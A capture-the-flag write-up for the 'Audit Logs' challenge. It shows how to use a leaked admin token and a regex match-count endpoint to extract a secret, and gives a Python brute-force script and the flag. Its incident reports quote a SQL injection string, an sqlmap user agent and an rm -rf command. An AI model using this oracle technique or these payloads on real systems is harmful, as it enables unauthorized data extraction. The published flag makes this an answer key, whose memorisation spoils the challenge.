---
challenge: Audit Logs
description: \*\*\*\nEvery action is logged, but not all logs are what they seem. Dive into TrailSec, an audit trail system, uncover hidden clues in system reports, and extract the flag.
flag: ATR{EFFICIENT_IN_SEARCHING_I_SEE}
scoring: standard(450)
value: 450
category: Hard
authors: Sean McGinty
---

# Audit Logs

[Back to Home](../../README.md)

## Points

Hard - 450 points

## Description

Every action is logged, but not all logs are what they seem. Dive into TrailSec, an audit trail system, uncover hidden clues in system reports, and extract the flag.

## Solution

After requesting a container and opening the link provided, we are presented with a text response of:

```
TrailSec Report Backend Service. Try /view_report?id=1.
```

We can go to `/view_report?id=1` and see the following:

```
Incident Report #1: System health check passed. No anomalies detected in the past 24 hours.
```

After continuing to increment the ID, we can see that the report IDs are not sequential. We'll repeat this process until we reach the ID of `16`, which gives us the following:

```
No such report.
```

We have gathered the following reports:

| Report ID | Incident Report                                                         |
|-----------|-------------------------------------------------------------------------|
| 1         | System health check passed. No anomalies detected in the past 24 hours. |
| 2         | Multiple failed login attempts detected on Admin Panel (IP: 192.168.10.42). Recommendation: Lock account after 3 failed attempts. |
| 3         | Unauthorized SSH key detected on production server. Removed unknown key fingerprint: SHA256:9gqMxyz9uYxKxyzNJJvNabcd== Audit initiated. |
| 4         | User "joleen" reported a slow system response. Root cause: Excessive CPU usage from excessive video playback during work hours. Flagged as non-critical. |
| 5         | Report ID mismatched during sync. Please contact support-desk@comssa.org.au. |
| 6         | Audit logs showed a request to from unauthorized IP. Query parameters were retained. Token mismatch suspected. Recommend reviewing logs for ?token= anomalies. |
| 7         | A regex pattern caused a service slowdown. Pattern submitted: (?=f.la)g Note: Log parser incorrectly flagged this as an error. |
| 8         | Request flood detected from IP: 203.0.113.99 User-Agent: sqlmap/1.4.6.10#dev Mitigation: Block IP via WAF. |
| 9         | Query string anomaly on : ?id=' OR '1'='1' Entry logged in audit trail. |
| 10        | Suspicious access to \`/matches\` with token: ADMIN_TOKEN Access denied. Logged for review.  |
| 11        | Querying number of matches may information. Confirmed via penetration test conducted by Red Team. |
| 12        | Coffee machine requested IP lease from DHCP server. Denied. Machine: "MrBean" (MAC: DE:AD:BE:A2:01:23) |
| 13        | User mistyped \`rm -rf /admin\` during onboarding demo. System backup restored successfully. |
| 14        | User "staff02" wanted a more powerful way to search secure files to get the number of files. Resolution: Gave access with our matches endpoint. |
| 15        | Our system was targeted by a DDoS attack. Mitigation: Rate limiting and IP blacklisting implemented. Recommendation: Review firewall rules and increase bandwidth. |

Looking through the reports, `#10` is interesting as it mentions a token of `ADMIN_TOKEN` on a request to `/matches`. There are some other reports that mention regex patterns, the matches route and ?token in `#6`.

When making a GET request to `/matches` with no parameters, we get a response of:

```
{"error":"Invalid token."}
```

Let's add in that token and see what we get `/matches?token=ADMIN_TOKEN`:

```
{"error":"Missing regex pattern."}
```

We can try adding a pattern parameter, say `?token=ADMIN_TOKEN&pattern=abc`, and we get a response of:

```
{"matches":0}
```

This is promising, let's try a `.*` regex pattern to see if we can get any matches:

```
{"matches":6}
```

We can successfully match all matches even if we don't know what they are. We know that the flag is in the format of `ATR{...}` so we can try to match that. We can use the regex pattern `ATR{.*}` and we get a response of:

```
{"matches":1}
```

From here it is just a matter of brute forcing the flag. You should try to be systematic about this. For example, you could work out the character set first. Using `pattern=ATR{[A-Z_]*}` will show that the flag is all uppercase letters and underscores.

One approach is to work out what letters are in the flag with `pattern=ATR{[ABCDEFGHIJKLMNOPQRSTUVWXYZ_]*}` and removing letters. After removing a letter, if the number of matches is the same, you know that letter is not in the flag. You can repeat this process until you have `pattern=ATR{[ACEFGHINRST_]*}`.

From this point it is a matter of brute forcing the flag. You can use a script to do this, or you can do it manually.

Here is an example script that will brute force the flag:

```python
import requests

BASE_URL = "http://<ip>:<port>/matches" # replace with actual server ip and port
TOKEN = "ADMIN_TOKEN"
CHARSET = "ACEFGHINRST_"
FLAG_PREFIX = "ATR{"
FLAG_SUFFIX = "}"

def test_flag(flag):
    pattern = f"{FLAG_PREFIX}{flag}{FLAG_SUFFIX}"
    response = requests.get(BASE_URL, params={"token": TOKEN, "pattern": pattern})
    return response.json().get("matches", 0) == 1

def brute_force_flag():
    flag = ""
    while True:
        for char in CHARSET:
            test_pattern = flag + char
            if test_flag(test_pattern + ".*"):
                flag += char
                print(f"Current flag: {FLAG_PREFIX}{flag}")
                break
        else:
            # No more characters match, flag is complete
            print(f"Flag found: {FLAG_PREFIX}{flag}{FLAG_SUFFIX}")
            break

if __name__ == "__main__":
    brute_force_flag()

# ...
# Current flag: ATR{EFFICIENT_IN_SEARCHING_I_SE
# Current flag: ATR{EFFICIENT_IN_SEARCHING_I_SEE
# Flag found: ATR{EFFICIENT_IN_SEARCHING_I_SEE}
```

After waiting for a minute or two, you'll get a flag of `ATR{EFFICIENT_IN_SEARCHING_I_SEE}`.

See [https://github.com/s3ansh33p/atr25_logs_challenge](https://github.com/s3ansh33p/atr25_logs_challenge) for the source code (was not available during the event).
